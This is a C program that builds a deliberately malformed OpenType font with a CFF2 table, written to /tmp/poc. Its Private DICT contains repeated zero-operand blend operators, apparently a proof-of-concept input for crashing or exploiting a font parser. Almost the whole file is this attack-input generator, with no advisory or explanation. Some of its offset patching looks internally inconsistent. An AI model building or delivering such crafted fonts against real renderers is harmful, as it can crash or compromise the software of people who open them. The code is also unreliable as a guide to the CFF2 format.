#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_vlq(FILE *f, uint32_t v) {
    if (v <= 27) {
        fputc((uint8_t)v, f);
    } else if (v <= 0x7FFF) {
        fputc(0x1C, f);
        fputc((v >> 8) & 0xFF, f);
        fputc(v & 0xFF, f);
    } else {
        fputc(0x1D, f);
        fputc((v >> 24) & 0xFF, f);
        fputc((v >> 16) & 0xFF, f);
        fputc((v >> 8) & 0xFF, f);
        fputc(v & 0xFF, f);
    }
}

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* CFF2 table record (offset will be 28) */
    write_uint32(f, 0x43464632);
    write_uint32(f, 0);
    write_uint32(f, 28);
    write_uint32(f, 0);

    long cff2_start = ftell(f); /* should be 28 */

    /* CFF2 Header: 4 bytes */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x04, f);
    fputc(0x01, f);

    /* Top DICT data */
    long top_dict_start = ftell(f);

    /* FDArray: offset then operator (0x0C 0x18) */
    fputc(0x00, f);  /* placeholder */
    fputc(0x0C, f);
    fputc(0x18, f);

    /* CharStrings: offset then operator (17 = 0x11) */
    fputc(0x00, f);  /* placeholder */
    fputc(0x11, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = (uint16_t)(top_dict_end - top_dict_start);

    /* Write topDictLength at correct position (after header) */
    fseek(f, cff2_start + 4, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* Global Subr INDEX (empty) */
    write_uint32(f, 0);

    /* FDArray INDEX */
    long fdarray_start = ftell(f);
    write_uint32(f, 1);    /* count = 1 */
    write_uint32(f, 2);    /* offSize = 2 */
    write_uint16(f, 0);    /* offset[0] = 1 */
    write_uint16(f, 1);
    long fdarray_off1 = ftell(f);
    write_uint16(f, 0);    /* offset[1] placeholder */
    write_uint16(f, 0);

    /* Font DICT */
    long font_dict_start = ftell(f);

    /* Private: size, offset, then operator (18 = 0x12) */
    fputc(0x00, f);  /* size placeholder */
    fputc(0x00, f);  /* offset placeholder */
    fputc(0x12, f);  /* Private operator */

    long font_dict_end = ftell(f);
    uint32_t font_dict_len = (uint32_t)(font_dict_end - font_dict_start);
    fseek(f, fdarray_off1, SEEK_SET);
    write_uint16(f, 0);
    write_uint16(f, 1 + font_dict_len);
    fseek(f, font_dict_end, SEEK_SET);

    /* Private DICT */
    long private_dict_start = ftell(f);

    /* First blend: count=1, 5 zeros, operator 0x0C 0x1E */
    fputc(0x01, f);  /* numBlends = 1 (VLQ: value 1) */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x0C, f);
    fputc(0x1E, f);  /* blend */

    /* Second blend: count=1, 5 zeros, operator 0x0C 0x1E */
    fputc(0x01, f);  /* numBlends = 1 */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x00, f);  /* 0 */
    fputc(0x0C, f);
    fputc(0x1E, f);  /* blend */

    long private_dict_end = ftell(f);
    uint32_t private_dict_size = (uint32_t)(private_dict_end - private_dict_start);

    /* CharStrings INDEX */
    long charstrings_start = ftell(f);
    write_uint32(f, 1);
    write_uint32(f, 1);
    write_uint32(f, 1);
    long charstrings_end = ftell(f);

    /* Patch Top DICT offsets */
    fseek(f, top_dict_start, SEEK_SET);
    write_vlq(f, (uint32_t)(fdarray_start - cff2_start));
    fseek(f, top_dict_start + 3, SEEK_SET);
    write_vlq(f, (uint32_t)(charstrings_start - cff2_start));

    /* Patch Font DICT Private operands */
    fseek(f, font_dict_start, SEEK_SET);
    write_vlq(f, private_dict_size);
    write_vlq(f, (uint32_t)(private_dict_start - cff2_start));

    /* Patch CFF2 table length */
    long cff2_end = ftell(f);
    uint32_t cff2_length = (uint32_t)(cff2_end - cff2_start);
    fseek(f, 24, SEEK_SET);
    write_uint32(f, cff2_length);

    fclose(f);
    return 0;
}